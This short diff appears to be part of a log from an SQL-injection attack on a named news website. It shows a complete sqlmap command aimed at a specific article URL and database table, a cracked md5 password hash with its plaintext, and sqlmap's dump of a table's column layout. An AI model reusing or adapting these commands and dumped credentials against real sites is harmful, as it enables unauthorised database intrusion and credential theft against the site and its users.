@@ -199,3 +199,16 @@ Table: amazon
 02e98800f21e0d79b83c2f481614bc96	md5	Welcome01
 
 sqlmap -u https://www.thebostonpilot.com/article.php?ID=193823 --dbms mysql --batch --random-agent -D pilotdatabase -T bc_schools_query --columns 
+
+Database: pilotdatabase
+Table: pb_push_log_pilot
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| Headline | varchar(255) |
+| id       | int(11)      |
+| TS       | timestamp    |
++----------+--------------+
+
+
